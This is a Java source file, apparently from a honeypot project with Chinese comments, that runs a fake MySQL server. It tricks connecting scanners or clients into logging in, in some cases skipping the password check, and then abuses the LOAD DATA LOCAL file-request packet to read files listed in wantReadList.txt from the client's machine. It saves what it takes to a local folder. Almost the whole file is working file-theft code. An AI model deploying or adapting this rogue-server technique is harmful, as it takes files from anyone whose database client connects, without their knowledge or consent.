package org.sec.Network;

import org.apache.log4j.Logger;
import org.sec.Constant.configuration;
import org.sec.Crypt.SecurityUtil;
import org.sec.utils.FileUtils;
import org.sec.utils.stringUtils;
import org.sec.utils.test.test.sendMail;

import java.io.*;
import java.net.ServerSocket;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class Socket extends Thread {
    public static String biteClient;
    private final ServerSocket serverSocket;

    private static List<String> logOutput = new ArrayList<>();

    public static byte[] usernameByte;

    public static boolean isHavePassword = true;
    private static final Logger logger = Logger.getLogger(Socket.class);

    public static void main(String[] args) {
        connect(configuration.PORT);
    }

    public static void connect(int port) {
        try {
            Thread t = new Socket(port);
            t.run();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception ignored) {
        }
    }

    public Socket(int port) throws IOException {
        serverSocket = new ServerSocket(port);
        serverSocket.setReceiveBufferSize(1024);
    }

    // 欺骗扫描器登录
    public void DeceptionScanner() throws IOException {
        configuration.getInstance();
        while (true) {
            java.net.Socket server = null;
            String ip;
            while (true) {
                try {
                    server = serverSocket.accept();
                    assert server != null;
                    ip = server.getRemoteSocketAddress().toString().substring(1);
                    String port = ip.substring(ip.lastIndexOf(":") + 1);
                    ip = ip.substring(0, ip.lastIndexOf(":"));

                    DataInputStream in = new DataInputStream(server.getInputStream());
                    DataOutputStream out = new DataOutputStream(server.getOutputStream());

                    // 如果客户端连接上了,则查看客户端的ip是否超过阈值,超过则返回1129错误码,并结束socket
                    if (isBlockIp(ip)) {
                        configuration.return1129(out, ip);
                        break;
                    }
                    logger.info("[+] 已上钩的客户端: " + ip + " " + port);
                    biteClient = "[+] " + biteClient + " 已上钩的客户端: " + ip + " " + port;
                    logOutput.add(biteClient);
                    if(configuration.sendMail){
                        sendMail.testSendEmail();
                    }
                    FileUtils.writeLines(configuration.logFileName, logOutput, true);
                    logOutput.clear();

                    long startTime = System.currentTimeMillis();
                    out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
                    long endTime = System.currentTimeMillis();
                    long elapsedTime = endTime - startTime;
                    // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
                    if (elapsedTime > 10000) {
                        recordIp(ip);
                        if (isBlockIp(ip)) {
                            out = new DataOutputStream(server.getOutputStream());
                            configuration.return1129(out, ip);
                        }
                        server.close();
                        break;
                    }
                    byte[] bys = new byte[1024];
                    byte firstByte = in.readByte();
                    int bysLength = in.read(bys);       // 接受客户端发来的验证信息(如账号密码)
                    byte[] newByteArray = new byte[bysLength + 1];
                    System.arraycopy(bys, 0, newByteArray, 1, bysLength);
                    newByteArray[0] = firstByte;

                    // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
                    if (!handlePassword(newByteArray)) {
                        configuration.return1045(out, ip);
                        break;
                    }
                    configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
                    int wantReadListSize = configuration.wantReadList.size();
                    String filename = "";   //configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
                    boolean isBeginRead = false; // isBeginRead为true时,说明已经能开始使用load data漏洞了.

                    out.write(configuration.verificationText);  // res ok
                    out.flush();
                    bys = new byte[1024];

                    while (in.read(bys) != -1) {
                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys)) || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8), getRequest(bys))
                                || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8mb4), getRequest(bys))
                        ) {
                            isBeginRead = true;
                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showVariable), getRequest(bys))) {
                            // 如果res为 showVariable
                            out.write(stringUtils.hexToByteArray(configuration.showVariablesRes1));
                            out.write(stringUtils.hexToByteArray(configuration.showVariablesRes2));
                            out.flush();
                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showWarnings), getRequest(bys))) {
                            // 如果res为 showWarnings
                            out.write(stringUtils.hexToByteArray(configuration.showWarningsRes));
                            out.flush();
                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showCollation), getRequest(bys))) {
                            // 如果res为 showCollation
                            out.write(stringUtils.hexToByteArray(configuration.showCollationRes));
                            out.flush();
                            //isBeginRead = true;
                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.maxAllowedPacket), getRequest(bys))) {
                            out.write(stringUtils.hexToByteArray(configuration.maxAllowedPacketRes));
                            out.flush();
                        } else if (Arrays.equals(stringUtils.hexToByteArray("0e"), getRequest(bys))) {
                            // res ok
                            out.write(configuration.verificationText);
                            out.flush();
                        }
                        if (isBeginRead) {
                            // 全部顺序读取
                            for (int i = 0; i < wantReadListSize; i++) {
                                filename = configuration.wantReadList.get(i);
                                if (getData(filename, server)) {
                                    break;
                                }
                            }
                        }
                    }


                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (server != null) {
                        server.close();
                    }
                }
            }
        }
    }

    public void run() {
        try {
            DeceptionScanner();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * 获取客户端发来的request,然后进行处理
     */
    public static byte[] getRequest(byte[] bys) {
        byte[] newByte = new byte[]{bys[0], bys[1], bys[2]};
        int packetLength = stringUtils.byteArrayToDecimalByHigh(newByte);

        if (bys[4] == 3) {
            byte[] outcome = new byte[packetLength - 1];
            for (int i = 0; i < packetLength - 1; i++) {
                outcome[i] = bys[5 + i];
            }
            return outcome;
        } else if (bys[4] == 14) {
            newByte[0] = 14;
            return newByte;
        }
        return null;
    }

    /**
     * 记录连接中不稳定的ip
     */
    public static void recordIp(String ip) {
        // 只要连接出错了,就将ip记录进 blockIpList.txt
        List<String> writeLines = new ArrayList<>();
        writeLines.add(ip);
        FileUtils.writeLines(".\\blockIpList.txt", writeLines, true);
    }

    /**
     * 如果连接失败次数超过15次,block掉,即返回true
     */
    public static boolean isBlockIp(String ip) {
        // 如果连接失败次数超过15次,block掉
        List<String> readLines = FileUtils.readLines(".\\blockIpList.txt");
        int counter = 0;
        for (String line : readLines) {
            if (line.equals(ip)) {
                counter++;
            }
        }
        if (counter >= 15) {
            return true;
        }
        return false;
    }

    /**
     * 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
     */
    public static boolean handlePassword(byte[] bys) throws NoSuchAlgorithmException {
        if(configuration.closeCheck){
            return true;
        }

        // 对SNETCracker扫描器自动关闭密码验证
        boolean isSNETCracker = false;
        if (bys[6] == 7 && bys[7] == 0 && bys[12] == 8) {
            isSNETCracker = true;
        }

        byte[] clientPassword = new byte[20];
        // 1.读取packet中的username,从36开始
        int usernameLength = 0, i = 0;
        while (bys[36 + i] != (byte) 0x00) {
            i++;
            usernameLength++;
        }
        char[] usernameByChar = new char[usernameLength];
        usernameByte = new byte[usernameLength];
        for (i = 0; i < usernameLength; i++) {
            usernameByChar[i] = (char) bys[36 + i];
            System.arraycopy(bys, 36 + i, usernameByte, i, 1);
        }

        // 2.验证username是否存在,不存在直接不给客户端连接(使用fileUtils实现)
        List<String> lines = FileUtils.readLines(configuration.correctUserInfo);
        String[] usernameAndPassword, passwordList = new String[lines.size()];
        StringBuilder username = new StringBuilder(new String());
        for (i = 0; i < usernameByChar.length; i++) {
            username.append(usernameByChar[i]);
        }
        int flag = 0, counter = 0;   // 标记客户端发来的用户名是否存在,存在则flag = 1;
        for (String line : lines) {
            usernameAndPassword = stringUtils.splitBySymbol(line, " ");
            if (Objects.equals(username.toString(), usernameAndPassword[0])) {
                flag = 1;
                break;
            }
        }
        if (flag == 0) {
            return false;
        }

        // 即username后的第一个byte为00的情况 //3.读取packet中的password
        int passwordLength = bys[usernameLength + 36 + 1];
        if (passwordLength == 0) {
            isHavePassword = false; // 我这里为了省事,直接设置没有无密码登录
            flag = 0;
        } else if (passwordLength != 20) {
            return isSNETCracker;
        } else if (isSNETCracker) {
            return true;
        } else {
            for (i = 0; i < passwordLength; i++) {
                clientPassword[i] = bys[usernameLength + 36 + 2 + i];
            }
            // 4.获取correctUserInfo.txt中的password
            for (String line : lines) {
                usernameAndPassword = stringUtils.splitBySymbol(line, " ");
                passwordList[counter] = usernameAndPassword[1];
                counter++;
            }
            flag = 0;
            // 5.获取salt并结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功
            for (String password : passwordList) {
                byte[] serverPassword = comparePassword(password, stringUtils.hexToByteArray(configuration.randomSaltValue));
                if (Arrays.equals(clientPassword, serverPassword)) {
                    flag = 1;
                    break;
                }
            }
        }
        return flag > 0;
    }

    /**
     * 验证客户端发来的密码是否正确
     */
    public static byte[] comparePassword(String passwd, byte[] salt) throws NoSuchAlgorithmException {
        byte[] password = passwd.getBytes();
        return SecurityUtil.scramble411(password, salt);
    }

    /**
     * 蜜罐的核心攻击方式:获取客户端的某个文件
     */
    public static boolean getData(String filename, java.net.Socket server) throws IOException {
        logger.info("[+] 服务端想要获取的文件为: " + filename);
        logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 服务端想要获取的文件为: " + filename);
        FileUtils.writeLines(configuration.logFileName, logOutput, true);
        logOutput.clear();

        byte[] byte1 = new byte[]{(byte) (filename.length() + 1)};
        byte[] byte2 = {0x00, 0x00, 0x01, (byte) 0xfb};
        byte[] byte3 = filename.getBytes(StandardCharsets.UTF_8);

        byte[] lastByte = stringUtils.byteMerger(byte1, byte2);
        lastByte = stringUtils.byteMerger(lastByte, byte3);

        DataInputStream in = new DataInputStream(server.getInputStream());
        DataOutputStream out = new DataOutputStream(server.getOutputStream());

        out.write(lastByte);
        out.flush();
        byte[] bys = new byte[9999];
        int bysLength;
        boolean readSuccess = false, again = false, isExit = false;
        while ((bysLength = in.read(bys)) != -1) {
            if (bys[0] != 0 && bys[3] != 0) {
                logger.info("[+] 获取结果:获取文件成功! 文件已保存进getData文件夹中");
                logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件成功! 文件已保存进getData文件夹中");

                String getData = new String(bys, 0, bysLength);
                System.out.println("\n-----------------------------------------\n" + getData + "\n-----------------------------------------\n");
                FileWriter writer = new FileWriter("getData" + File.separator + filename.substring(filename.lastIndexOf(File.separator)));
                writer.write(getData);
                writer.close();
                readSuccess = true;
            } else if (bys[0] == 1 && bys[1] == 0 && bys[2] == 0 && bys[4] == 1) {
                out.write(configuration.verificationText);  // res ok
                isExit = true;
            } else if (!readSuccess) {
                again = true;
                logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在/被客户端拦截/客户端发包扫描结束");
                logOutput.add("[-] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
            }
        }
        if (!readSuccess && !again) {
            logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在/被客户端拦截/客户端发包扫描结束");
            logOutput.add("[-] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
        }

        FileUtils.writeLines(configuration.logFileName, logOutput, true);
        logOutput.clear();
        return isExit;
    }
}
